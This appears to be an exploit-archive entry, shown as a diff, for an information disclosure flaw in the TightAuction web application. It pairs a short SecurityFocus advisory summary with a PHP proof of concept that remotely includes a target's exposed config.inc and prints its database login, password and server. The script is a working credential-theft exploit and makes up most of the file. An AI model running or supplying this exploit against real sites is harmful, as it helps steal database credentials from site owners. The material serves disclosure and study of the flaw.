@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/5850/info
+
+TightAuction is prone to an information disclosure vulnerability. The configuration file (config.inc) contains sensitive information such as database authentication credentials. It is possible for remote attackers to retrieve this file via a web request, and since the file does not have the correct extension (.inc.php) the contents will be rendered in a web browser instead of interpreted.
+
+
+<?
+$victime="http://[target]";
+include("$victime/config.inc");
+print("Infos de la DataBase du site $victime : \n \n");
+print("Login : $DB_Username \nPassword : $DB_Password \nServer :
+$DB_Database");
+?>
